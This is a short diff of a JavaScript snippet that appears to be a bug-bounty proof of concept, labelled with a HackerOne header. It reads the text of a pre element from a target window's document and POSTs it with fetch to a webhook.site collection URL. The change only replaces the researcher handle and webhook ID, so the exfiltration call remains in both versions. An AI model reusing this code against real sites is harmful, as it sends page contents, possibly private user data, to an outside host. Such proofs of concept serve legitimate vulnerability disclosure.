@@ -8,7 +8,7 @@
     const data = target.document.querySelectorAll('pre')[0].firstChild.data
     console.log(data)
   
-    const headers = {'Access-Control-Allow-Origin': '*','X-Bug-Bounty': 'Hackerone-johnathanrs','Content-Type': 'application/json'};
-    fetch('https://webhook.site/1da67bcc-a46f-48c1-b171-9339305c7be0',{method:'POST',body:JSON.stringify(data), headers:headers})
+    const headers = {'Access-Control-Allow-Origin': '*','X-Bug-Bounty': 'Hackerone-11','Content-Type': 'application/json'};
+    fetch('https://webhook.site/1da67bcc-a46f-48c1-11-11',{method:'POST',body:JSON.stringify(data), headers:headers})
   })
 })();
